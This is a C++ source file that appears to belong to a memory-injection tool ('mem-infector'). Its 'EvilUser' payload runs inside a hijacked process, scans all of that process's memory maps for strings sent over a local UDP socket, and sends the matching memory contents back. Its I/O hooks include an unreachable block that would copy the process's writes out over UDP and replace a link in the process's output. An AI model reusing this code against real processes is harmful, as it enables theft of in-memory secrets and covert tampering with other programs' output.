#include "eviluser.h"
#include "target/targetopt.h"

#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <unistd.h>
#include <memory>
#include <string.h>

#define MAX_TMPBUFFER_SIZE 100000
static int sockFd = 0;

EvilUser::EvilUser() :
    tmpBuffer(nullptr)
{}

EvilUser::~EvilUser()
{
    if (tmpBuffer)
        free(tmpBuffer);
}

//  二进制查找
int BinaryFind(const unsigned char * Dest, int DestLen, 
               const unsigned char * Src, int SrcLen)   
{   
	int j = 0;
	for (int i=0; i<DestLen; i++)   
	{   
		for (j=0; j<SrcLen; j++)   
			if (Dest[i+j] != Src[j])	
				break;
		if (j == SrcLen) 
			return i;	// 找到返回离Dest的距离(从0开始计算)
	}   
	return -1;		// 未找到返回-1
}

bool searchBinary(int sockFd, struct sockaddr_in *client, Elf64_Addr baseAddr, 
                  int size, unsigned char *str, int strSize)
{
    int ret = 0;
    unsigned char *p = (unsigned char *)baseAddr;
    bool status = false;
    while (1)
    {
        ret = BinaryFind(p, (unsigned char *)baseAddr+size-p, str, strSize);
        if (ret < 0)
        {
            if (status)
                return true;
            return false;
        }
            
        status = true;
        p += ret;
        sendto(sockFd, p, strSize+20, 0,(struct sockaddr*)client,sizeof(*client)); 
        sendto(sockFd, "\n", 2, 0,(struct sockaddr*)client,sizeof(*client)); 
        p += 1;

        if (p - (unsigned char *)baseAddr >= size)
            return true;
    }      
}

#define COLOR_RED       "\e[1;31m"        //鲜红
#define COLOR_GREEN       "\e[0;32m"         //深绿，暗绿
#define COLOR_NONE      "\e[0m" 

struct sockaddr_in local;
void EvilUser::evilMain()
{
    TargetMaps t(getpid());
    t.readTargetAllMaps();
    std::list<MapInfo> l = t.getMapInfo();

    if (!sockFd)
    {
        sockFd = socket(AF_INET,SOCK_DGRAM,0);
        struct sockaddr_in local;
        local.sin_family=AF_INET;
        local.sin_port = htons(11111);
        local.sin_addr.s_addr = inet_addr("127.0.0.1");
        bind(sockFd, (struct sockaddr*)&local, sizeof(local));
    }

    char buf[1024] = {0};
    struct sockaddr_in remote;
    socklen_t len=sizeof(remote);
    char buffer[256] = {0};
    char *finishStr = COLOR_GREEN"=========================finish========================="COLOR_NONE"\n";
    while(1)
    {
        memset(buf, 0, sizeof(buf));
        memset(buffer, 0, sizeof(buffer));
        ssize_t _s = recvfrom(sockFd, buf, sizeof(buf)-1 , 0 , (struct sockaddr*)&remote, &len);
        if (!strncmp(buf, "X", 1) || strlen(buf) < 5) continue;
        *(char *)strchr(buf, '\n') = '\0';
        
        snprintf(buffer, sizeof(buffer), COLOR_GREEN"=========================start=========================" 
                "\nstr = \"%s\", size = %d\n"COLOR_NONE, buf, strlen(buf));

        sendto(sockFd, buffer, strlen(buffer), 0,(struct sockaddr*)&remote,sizeof(remote));
        for (auto &s : l)
        {
            if (s.mapName.find("libinject.so") != std::string::npos) continue;
            if (searchBinary(sockFd, &remote, s.baseAddr, s.size, (unsigned char *)buf, strlen(buf)))
            {
                snprintf(buffer, sizeof(buffer), COLOR_RED"SO base = %p, size = %lx, name = %s\n"COLOR_NONE, 
                    s.baseAddr, s.size, s.mapName.c_str());
                sendto(sockFd, buffer, strlen(buffer), 0,(struct sockaddr*)&remote,sizeof(remote)); 
            }
        }

        sendto(sockFd, finishStr, strlen(finishStr), 0,(struct sockaddr*)&remote,sizeof(remote)); 
    }
}

ssize_t EvilUser::evilAccept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
    return 0;
}

ssize_t EvilUser::evilRead(int fd, void *&buf, size_t &count)
{
    return 0;
}

ssize_t EvilUser::evilSend(int sockfd, const void *&buf, size_t &len, int flags)
{
    return 0;
}

ssize_t EvilUser::evilWrite(int fd, const void *&buf, size_t &count)
{
    return 0;
    if (!sockFd)
    {
        sockFd=socket(AF_INET,SOCK_DGRAM,0);
    }

          struct sockaddr_in client;
    client.sin_family=AF_INET;
    client.sin_port=htons(11111);
    client.sin_addr.s_addr=inet_addr("127.0.0.1");

    sendto(sockFd, buf, count,0,(struct sockaddr*)&client,sizeof(client)); 
    return 0;

    if (!tmpBuffer)
        tmpBuffer = (char *)malloc(MAX_TMPBUFFER_SIZE);

    char *p = NULL;
    char *injectLink = "  https://github.com/lmclmc/mem-infector";
    char *wikiLink = "https://wiki.apache.org/tomcat/FrontPage";

    size_t retSize = 0;
    if ((p = (char *)strstr((const char *)buf, wikiLink)))
    {
        int wikiLinkSize = strlen(wikiLink);
        memcpy(p, injectLink, wikiLinkSize);
        sendto(sockFd, buf, count,0,(struct sockaddr*)&client,sizeof(client)); 
    }

    return 0;
}